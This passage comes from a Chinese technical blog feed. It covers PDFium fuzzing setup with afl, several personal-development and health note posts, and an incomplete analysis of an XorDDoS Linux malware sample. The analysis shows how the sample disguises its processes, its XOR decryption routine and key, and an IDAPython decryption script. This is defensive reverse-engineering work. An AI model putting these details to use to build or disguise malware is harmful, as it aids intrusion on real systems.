速度，应该开启。另外一个比较有用的是<br><code>symbol_level</code>, 设置 symbol_level&#x3D;1 可以添加必要的调试符号，便于gdb调试。</p><p>在编译 skia backend 支持时，需要额外处理， 使用 C++14</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">use_cxx11</span> = <span class="hljs-literal">false</span> <br></code></pre></td></tr></table></figure><h2 id="afl-fuzz"><a href="#afl-fuzz" class="headerlink" title="afl-fuzz"></a>afl-fuzz</h2><p>随着 chromium 代码的更新， afl 源码编译出现了一些小问题，需要处理。</p><p>src&#x2F;third_party&#x2F;afl&#x2F;patches&#x2F;0001-fix-build-with-std-c11.patch</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/afl-fuzz.c b/afl-fuzz.c</span><br><span class="hljs-comment">index 01b4afef0ecc..f0d564a33037 100644</span><br><span class="hljs-comment">--- a/afl-fuzz.c</span><br><span class="hljs-comment">+++ b/afl-fuzz.c</span><br><span class="hljs-meta">@@ -23,7 +23,9 @@</span><br> #define AFL_MAIN<br> #define MESSAGES_TO_STDOUT<br> <br><span class="hljs-addition">+#ifndef _GNU_SOURCE</span><br> #define _GNU_SOURCE<br><span class="hljs-addition">+#endif</span><br> #define _FILE_OFFSET_BITS 64<br> <br> #include &quot;config.h&quot;<br><span class="hljs-comment">diff --git a/types.h b/types.h</span><br><span class="hljs-comment">index 784d3a7a286d..d24d1fdd97e8 100644</span><br><span class="hljs-comment">--- a/types.h</span><br><span class="hljs-comment">+++ b/types.h</span><br><span class="hljs-meta">@@ -78,7 +78,7 @@</span> typedef int64_t  s64;<br> #define STRINGIFY(x) STRINGIFY_INTERNAL(x)<br> <br> #define MEM_BARRIER() \<br><span class="hljs-deletion">-  asm volatile(&quot;&quot; ::: &quot;memory&quot;)</span><br><span class="hljs-addition">+  __asm__ volatile(&quot;&quot; ::: &quot;memory&quot;)</span><br> <br> #define likely(_x)   __builtin_expect(!!(_x), 1)<br> #define unlikely(_x)  __builtin_expect(!!(_x), 0)<br></code></pre></td></tr></table></figure><p>afl-fuzz 的使用和其他项目一样。初始的种子文件有几个地方可以获取：</p><ul><li><a href="https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/">https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/</a></li><li><a href="https://github.com/mozilla/pdf.js/tree/master/test/pdfs">https://github.com/mozilla/pdf.js/tree/master/test/pdfs</a></li></ul><p><code>./afl-fuzz -M 01 -m 1024 -i /home/henices/input -o /home/henices/out -x /tmp/pdf.dict -- ./pdfium_test @@</code></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html</a></li><li><a href="https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year.pdf">https://www.blackhat.com/docs/asia-17/materials/asia-17-Liu-Dig-Into-The-Attack-Surface-Of-PDF-And-Gain-100-CVEs-In-1-Year.pdf</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/getting_started.md</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/efficient_fuzzer.md">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/efficient_fuzzer.md</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md">https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md</a></li><li><a href="https://fuzzing-project.org/tutorial2.html">https://fuzzing-project.org/tutorial2.html</a></li><li><a href="https://blog.chromium.org/2012/04/fuzzing-for-security.html">https://blog.chromium.org/2012/04/fuzzing-for-security.html</a></li><li><a href="https://chromium.googlesource.com/chromium/src/+/lkcr/docs/linux_debugging.md">https://chromium.googlesource.com/chromium/src/+/lkcr/docs/linux_debugging.md</a></li><li><a href="https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF">https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF</a></li><li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html</a></li><li><a href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Learn In Public 摘要</title>
    <link href="/en/learn_in_public/"/>
    <url>/en/learn_in_public/</url>
    
    <content type="html"><![CDATA[<p>a habit of creating <strong>learning exhaust</strong>  </p><ul><li>Write blogs and tutorials and cheatsheets.  </li><li>Speak at meetups and conferences.  </li><li>Ask and answer things on Stackoverflow or Reddit.  <ul><li>Avoid the walled gardens like Slack and Discord, they’re not public.</li></ul></li><li>Make Youtube videos or Twitch streams.  </li><li>Start a newsletter.  </li><li>Draw cartoons (people loooove cartoons!)</li></ul><p>Whatever your thing is, make the thing you wish you had found when you were learning.  </p><ul><li><strong>Don’t judge your results by “claps” or retweets or stars or upvotes</strong></li></ul><p>Oh you think you’re done? Don’t stop there:  </p><ul><li>Enjoyed a coding video? Reach out to the speaker&#x2F;instructor and thank them, and ask questions.  </li><li>Make PR’s to libraries you use.  </li><li>Make your own libraries no one will ever use.  </li><li>Clone stuff you like, from scratch, to see how they work.  </li><li>Teach workshops.  </li><li>Go to conferences and summarize what you learned.</li></ul><p>The subheading under this rule would be: <strong>Try your best to be right, but don’t worry when you’re wrong.</strong>  </p><ul><li>People think you suck? Good. You agree. Ask them to explain, in detail, why you suck  </li><li>You want to just feel good or you want to <strong>be</strong> good?  <ul><li>Then go away and prove them wrong. Of course, if they get abusive block them.</li></ul></li></ul><p>At some point you’ll get some support behind you. People notice genuine learners. They’ll want to help you.  </p><ul><li>Don’t tell them, but they just became your mentors.  </li><li>This is very important: Pick up what they put down  </li><li>Because you learn in public. By teaching you, they teach many.</li></ul><p>source: <a href="https://www.swyx.io/learn-in-public/">https://www.swyx.io/learn-in-public/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图拉鼎谈独立开发</title>
    <link href="/cn/tulading/"/>
    <url>/cn/tulading/</url>
    
    <content type="html"><![CDATA[<p>独立开发</p><ul><li>长期维护产品：消费者愿意为长期维护的产品买单，旧产品没有添加新功能也用新工具链重新编译一次</li><li>只开发自己使用的产品：评估未来几年自己是否使用产品，作为是否启动产品开发的重要因素</li><li>外包 + 独立开发 双驱动<ul><li>用外包的收入平滑独立开发的收入波动</li><li>在产品开发瓶颈期，利用外包刺激，打开思路</li></ul></li></ul><p>项目管理</p><ul><li>立项流程: 先记下 idea，冷却一段时间后如果有思路就继续完善一下 idea，直到某天还是想做，接着就开始动手</li><li>没有市场分析，没有用户分析，只有分阶段完成的 1.0、2.0 … 版本</li><li>1.0 版本为自己开发，只开发最核心的功能，2-n 通过用户的反馈完善产品</li></ul><p>工作模式</p><ul><li>充分利用灵活性，在家和在外工作的时间大致是 2:1</li><li>定期与设计师碰头，每周2-3 次</li></ul><p>状态管理</p><ul><li>有多少状态做多少事，即使状态不太好，也需要做事。</li><li>外部环境对状态有影响，可以利用图书馆等场所，将自己带入状态。</li></ul><p>时间管理（自律）</p><ul><li>曾经经历工作混乱的时期，现在严格工作时间登记，自己开发系统完成工作时间登记。</li><li>自律还包括定期 Review (日报、周报)，计划管理，保持自己的开发节奏。</li><li>工作日基本都工作和上班无差异，除非遇上紧急的事。</li></ul><p>好奇心</p><ul><li>喜欢新技术，喜欢新产品，喜欢折腾 (ubuntu Tweak)</li></ul><p>敏感度</p><ul><li>独立开发者，需要通过社交媒体、邮件列表、newsletter 连接外部世界，保持对新事物的敏感度</li></ul><p>听完 podcast，我发现图拉鼎非常强调工作和兴趣的匹配度，这可能就是他能长期维护产品的一个重要原因。</p><p>reference: <a href="https://pca.st/5v33uy2z">https://pca.st/5v33uy2z</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>尤雨溪谈成功和运气</title>
    <link href="/cn/youyuxi/"/>
    <url>/cn/youyuxi/</url>
    
    <content type="html"><![CDATA[<p>1）运气很重要，时势造英雄<br>在适当的时间节点上推出合适的产品能大幅提高成功的概率<br>2）真正的关键点，不在写程序上<br>重要的是判断需求，制定合适的技术方案去满足客户的需求<br>3）成功需要市场直觉和产品上的判断力<br>4）光有能力或者光有运气都很难成功<br>运气是客观存在的，But there’s nothing we can do about it.<br>5）我们只能提高自己能力，多尝试，每次尝试运气都不一样<br>6）独立开发重要的不是技术的优劣，而是如何开发一个产品的问题</p><ul><li>如何快速匹配市场需求</li><li>如何识别目标客户</li><li>如何快速验证商业模式</li><li>如何快速推向市场。</li><li>考验的是运营能力、合理分配资源的能力，简化创业流程的能力</li></ul><p>reference: <a href="https://pca.st/yjf05b7i">https://pca.st/yjf05b7i</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>万维钢的强力研读笔记法</title>
    <link href="/cn/qiangliyandu/"/>
    <url>/cn/qiangliyandu/</url>
    
    <content type="html"><![CDATA[<p>清晰表达每一章的逻辑脉络</p><ul><li>按照书籍的章节给笔记划分章节，用自己的话写出每一个章节的内容，各章内容串联起来就成了整本书的内容提要</li><li>最重要的是理清作者的逻辑脉络，每一章的逻辑结构可能就几句话，却可能分散在大几十页的内容中</li></ul><p>带走书中的所有亮点</p><ul><li>读书不是划线式的重点内容总结，而应该注意让你拍案叫绝，点醒梦中人，这些可以刺激改变你的思维的内容</li></ul><p>大量自己的看法和心得</p><ul><li>强力研读是主动式的读书，你需要写下自己对一段内容或一句话的理解</li><li>你可以质疑或者肯定作者的看法，也可以写下自己阅读时的灵感</li><li>在写读书笔记的过程中，你可能突然解决了一个你以前关注的问题，也可能想到了书中思想一个应用场景</li><li>这些灵感都相当宝贵，转瞬即逝，一定要将把他们记录下来</li></ul><p>发现本书和其他书籍文章的联系</p><ul><li>极少书的思想是独立与世界的，大多新知识都是建立在旧知识的基础上的</li><li>同一问题，不同书籍的作者的看法有什么不同之处，有没有新的论据支持或者反对他们的看法</li></ul><p>好书需要至少阅读两遍</p><ul><li>第一遍是为了陷进去，第二遍是为了跳出来</li><li>第一遍阅读可能对领域内容不太熟悉，全部带宽都要用于理解作者的思想。</li><li>想法只有在带宽剩余时，才可能冒出来。为了最有价值的心得、灵感和联系，对好书我们至少阅读两遍</li><li>笔记是对好书最好的敬意，笔记不是书评，它是个人知识的延伸</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>端粒效应</title>
    <link href="/cn/living_younger_healthier_logger/"/>
    <url>/cn/living_younger_healthier_logger/</url>
    
    <content type="html"><![CDATA[<p>获得 2009 年诺贝尔生理或医学奖的 伊丽莎白·布莱克本在 《端粒效应》一书中说明：人只所以变老，是由于某些细胞不再更新了，而细胞分裂更新的限制在于 “端粒”。</p><p>端粒是染色体末端的 DNA 序列，在细胞分裂过程中，端粒起到保护 DNA 序列的作用。所以，人之所变老的本质原因是 「端粒变短」。</p><p>影响端粒变短的因素</p><ul><li>思想压力：研究表明长期照顾患病小孩的母亲，端粒长度较正常人变短</li><li>敌意：看哪儿都不对，和周围的人关系极差</li><li>悲观：对事情总有一个负面的预期</li><li>胡思乱想：抑郁，都是乱想负面的东西，觉得不公平对待</li></ul><p>缓解负面情绪的方法</p><ul><li>把压力视为挑战：对压力的反应是威胁还是挑战，决定压力的性质</li><li>专注力训练：冥想</li><li>找到人生的目标：find something bigger than yourself</li></ul><p>锻炼对端粒的好处</p><ul><li>人体是反脆弱系统：锻炼的本质是对身体的适度打击</li><li>细胞的反击：适度的锻炼能使端粒变长，并增加「自由基」</li><li>抗氧化剂增多：突然增多的自由基使得身体增加抗氧化剂，锻炼改变了自由基和抗氧化剂的平衡</li><li>锻炼到底是影响端粒还是端粒脢，分子生物学上的机制科学家现在还不知道</li></ul><p>两种科学的锻炼方法</p><ul><li>有氧耐力训练：长跑，每次跑四十五分钟，每周跑三次，坚持六个月，你的端粒酶的活性就能提高两倍</li><li>高强度的间歇训练：短跑结合恢复的办法，快跑几分钟，停下来慢走休息，然后再快跑</li></ul><p>节食和减肥的观念</p><ul><li>体重可能并不是肥胖的最好指标，更好的指标是 「腰臀比」</li><li>肚子大代表新陈代谢水平低，会让端粒变短</li><li>肚子大，腰臀比过高，胆固醇超标；高血压；胰岛素抵抗，具备三个就是新陈代谢综合症</li><li>饥饿节食减肥不可取，就算减下体重也很容易报复性反弹</li><li>糖可能是各种健康问题的罪魁祸首</li></ul><p>从端粒说，细胞有三个敌人</p><ul><li>细胞发炎：肥胖使细胞容易发炎，从而使端粒变短。omega-3 可以防止细胞发炎，鱼类、牛奶、有机鸡蛋中含有 omega-3 脂肪酸</li><li>氧化应激反应：维生素 C 和维生素 E 可以对抗氧化应急反应。饮食中可以吃些水果、胡萝卜、西红柿、土豆和绿叶蔬菜</li><li>胰岛素抵抗：对抗胰岛素抵抗，关键是要少吃糖</li></ul><p>从看端粒的角度分析饮食</p><ul><li>对端粒有害的食物有：红肉，加工肉类（香肠）、白面包、含糖饮料、omega-6 ，过量饮酒</li><li>对端粒有益的食物有：植物纤维、全麦、蔬菜、坚果、豆类、水果、海带、omega-3</li></ul><p>人的环境对端粒的影响</p><ul><li>城市的居民比乡村居民更容易视压力为威胁，因为城市居民的“杏仁核” 部位比较活跃，这个部位主要负责恐惧感</li><li>社会关系比金钱对端粒的影响更大，只要能满足基本的生活需求，金钱对端粒的影响就不大</li><li>受教育的程度对端粒影响很大，研究表明受教育程度越高端粒越长</li><li>职业很重要比收入对端粒影响大，一个从事基本工作的白领也比收入更高的蓝领端粒要长</li></ul><p>从端粒看，父母对孩子的影响</p><ul><li>遗传：端粒长度可以不通过基因遗传，而是“直接传递”，怀孕时父母的端粒比较短，孩子出生时端粒也就比较短</li><li>孕期压力：怀孕期间母亲的压力情况，人遇到压力会分泌皮质醇，从而影响孩子的端粒</li><li>家庭环境：越少父母的关爱，被父母忽视的孩子，端粒会比较短</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xorddos 样本进程隐藏的小伎俩</title>
    <link href="/cn/xorddos_hide/"/>
    <url>/cn/xorddos_hide/</url>
    
    <content type="html"><![CDATA[<h2 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h2><p>上周由于工作原因接触到xorddos的样本，这个样本在过去一年的时间里非常常见，<br>变种也很多，拿到的样本比较有趣的是 ps 无法发现进程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># ps -ef  | grep /usr/bin</span><br><br>...<br><br>root      4597  4594  0 00:37 ?        00:00:00 gnome-pty-helper<br>root      4598  4594  0 00:37 pts/1    00:00:00 bash<br>oracle    5359     1  0 00:41 ?        00:00:00 ora_smco_orcl<br>oracle    5378     1  0 00:41 ?        00:00:00 ora_w000_orcl<br>oracle    5586     1  0 00:42 ?        00:00:00 ora_j000_orcl<br>oracle    5588     1  0 00:42 ?        00:00:00 ora_j001_orcl<br>root      5666     1  0 00:43 ?        00:00:00 sh<br>root      5669     1  0 00:43 ?        00:00:00 <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;find&quot;</span><br>root      5672     1  0 00:43 ?        00:00:00 <span class="hljs-built_in">ls</span> -la<br>root      5675     1  0 00:43 ?        00:00:00 bash<br>root      5678     1  0 00:43 ?        00:00:00 gnome-terminal<br>root      5683     1  0 00:43 ?        00:00:00 <span class="hljs-built_in">cd</span> /etc<br>root      5686     1  0 00:43 ?        00:00:00 top<br>root      5689     1  0 00:43 ?        00:00:00 sh<br>root      5692     1  0 00:43 ?        00:00:00 gnome-terminal<br>root      5695     1  0 00:43 ?        00:00:00 ifconfig<br>root      5696  4598  0 00:43 pts/1    00:00:00 ps -ef<br></code></pre></td></tr></table></figure><p>而使用lsof却可以清除地看见样本正在努力地干活。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># lsof +d /usr/bin</span><br>COMMAND    PID USER  FD   TYPE DEVICE    SIZE    NODE NAME<br>hidd      1853 root txt    REG    3,1   33708 2467454 /usr/bin/hidd<br>ckucbzknt 2014 root txt    REG    3,1  610331 2459176 /usr/bin/ckucbzkntb<br>xfs       2143  xfs txt    REG    3,1  107460 2468483 /usr/bin/xfs<br>Xorg      3117 root txt    REG    3,1 1890596 2466732 /usr/bin/Xorg<br>gnome-ses 4073 root txt    REG    3,1  129356 2459482 /usr/bin/gnome-session<br>ssh-agent 4201 root txt    REG    3,1   88996 2467513 /usr/bin/ssh-agent<br>dbus-laun 4245 root txt    REG    3,1   23796 2471600 /usr/bin/dbus-launch<br>gnome-key 4255 root txt    REG    3,1   97396 2473617 /usr/bin/gnome-keyring-daemon<br>metacity  4290 root txt    REG    3,1  521080 2464500 /usr/bin/metacity<br>gnome-pan 4296 root txt    REG    3,1  540868 2465177 /usr/bin/gnome-panel<br>nautilus  4298 root txt    REG    3,1 1348932 2461620 /usr/bin/nautilus<br>gnome-vol 4310 root txt    REG    3,1   65240 2464498 /usr/bin/gnome-volume-manager<br>bt-applet 4334 root txt    REG    3,1   30452 2464773 /usr/bin/bt-applet<br>nm-applet 4352 root txt    REG    3,1  312432 2467723 /usr/bin/nm-applet<br>gnome-pow 4381 root txt    REG    3,1  195284 2459473 /usr/bin/gnome-power-manager<br>pam-panel 4383 root txt    REG    3,1   39148 2461862 /usr/bin/pam-panel-icon<br>dbus-laun 4473 root txt    REG    3,1   23796 2471600 /usr/bin/dbus-launch<br>gnome-scr 4512 root txt    REG    3,1  168628 2468487 /usr/bin/gnome-screensaver<br>gnome-ter 4594 root txt    REG    3,1  309368 2464648 /usr/bin/gnome-terminal<br>gadcgkcqn 4681 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni<br>gadcgkcqn 4684 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni<br>gadcgkcqn 4687 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni<br>gadcgkcqn 4690 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni<br>gadcgkcqn 4693 root txt    REG    3,1  610331 2460159 /usr/bin/gadcgkcqni<br></code></pre></td></tr></table></figure><p>阅读汇编代码，分析具体原因，发现xorddos将一些关键信息加密了，F5处理过的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">encrypt_code</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// ecx@2</span><br><br>  <span class="hljs-keyword">if</span> ( a2 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      *(_BYTE *)(v2 + a1) ^= xorkeys[(((_BYTE)v2 + ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v2 &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">28</span>)) &amp; <span class="hljs-number">0xF</span>)<br>                                   - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v2 &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">28</span>)];<br>      ++v2;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v2 != a2 );<br>  &#125;<br>  <span class="hljs-keyword">return</span> a1;<br>&#125;<br></code></pre></td></tr></table></figure><p>xorkey 为 BB2FA36AAA9541F0</p><p>用idapython 写个小脚本，简单处理一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> idautils <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> idc <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_string</span>(<span class="hljs-params">addr</span>):<br>  out = <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> Byte(addr) != <span class="hljs-number">0</span>:<br>      out += <span class="hljs-built_in">chr</span>(Byte(addr))<br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">break</span><br>    addr += <span class="hljs-number">1</span><br>  <span class="hljs-keyword">return</span> out<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data</span>):<br><br>  xorkey = <span class="hljs-string">&#x27;BB2FA36AAA9541F0&#x27;</span><br>  length = <span class="hljs-built_in">len</span>(data)<br>  o = <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-keyword">if</span> length &gt; <span class="hljs-number">0</span>:<br>    v2 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> v2 &lt; length:<br>      o += <span class="hljs-built_in">chr</span>( <span class="hljs-built_in">ord</span>(data[v2]) ^  <span class="hljs-built_in">ord</span>(xorkey[((v2 + ((v2 &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">28</span>)) &amp; <span class="hljs-number">0xF</span>) - ( (v2 &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">28</span>)]) )<br>      v2 += <span class="hljs-number">1</span><br><br>  <span class="hljs-keyword">return</span> o<br><br>ea = ScreenEA()<br>string = get_string(ea)<br>dec = decrypt(string)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Addr: 0x%x, %s&#x27;</span> % (ea, dec)<br>MakeComm(ea, dec)<br></code></pre></td></tr></table></figure><p>处理后可以看到伪装的命令行信息，daemonname。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:080CBB40 daemonname      db &#x27;!#Ff3VE.-7&#x27;,17h,&#x27;V[_ 0&#x27;,0 ; DATA XREF: main+31Eo<br>.data:080CBB40                                         ; main+4AEo ...<br>.data:080CBB40                                         ; cat resolv.conf<br>.data:080CBB51                 align 4<br>.data:080CBB54 a12             db &#x27;1*2&#x27;,0              ; sh<br>.data:080CBB58                 db    0<br>.data:080CBB59                 db    0<br>.data:080CBB5A                 db    0<br>.data:080CBB5B                 db    0<br>.data:080CBB5C                 db    0<br>.data:080CBB5D                 db    0<br>.data:080CBB5E                 db    0<br>.data:080CBB5F                 db    0<br>.data:080CBB60                 db    0<br>.data:080CBB61                 db    0<br>.data:080CBB62                 db    0<br>.data:080CBB63                 db    0<br>.data:080CBB64                 db    0<br>.data:080CBB65                 db    0<br>.data:080CBB66                 db    0<br>.data:080CBB67                 db    0<br>.data:080CBB68                 db  20h                 ; bash<br>.data:080CBB69                 db  23h ; #<br>.data:080CBB6A                 db  41h ; A<br>.data:080CBB6B                 db  2Eh ; .<br>.data:080CBB6C                 db  41h ; A<br>.data:080CBB6D                 db    0<br>.data:080CBB6E                 db    0<br>.data:080CBB6F                 db    0<br>.data:080CBB70                 db    0<br>.data:080CBB71                 db    0<br><br>...<br><br>.data:080CBBB8                 db  2Eh ; .             ; ls -la<br>.data:080CBBB9                 db  31h ; 1<br>.data:080CBBBA                 db  12h<br>.data:080CBBBB                 db  6Bh ; k<br>.data:080CBBBC                 db  2Dh ; -<br>.data:080CBBBD                 db  52h ; R<br>.data:080CBBBE                 db  36h ; 6<br>.data:080CBBBF                 db    0<br>.data:080CBBC0                 db    0<br>.data:080CBBC1                 db    0<br>.data:080CBBC2                 db    0<br>.data:080CBBC3                 db    0<br>.data:080CBBC4                 db    0<br>.data:080CBBC5                 db    0<br>.data:080CBBC6                 db    0<br>.data:080CBBC7                 db    0<br>.data:080CBBC8                 db    0<br>.data:080CBBC9                 db    0<br>.data:080CBBCA                 db    0<br>.data:080CBBCB                 db    0<br>.data:080CBBCC                 db  36h ; 6             ; top<br>.data:080CBBCD                 db  2Dh ; -<br>.data:080CBBCE                 db  42h ; B<br>.data:080CBBCF                 db  46h ; F<br>.data:080CBBD0                 db    0<br>.data:080CBBD1                 db    0<br>.data:080CBBD2                 db    0<br><br>...<br></code></pre></td></tr></table></figure><p>呵呵，已经看到 top， ls -al 等信息了，查看daemonname 的交叉引用，发现在main函数<br>中，到main里看看。</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 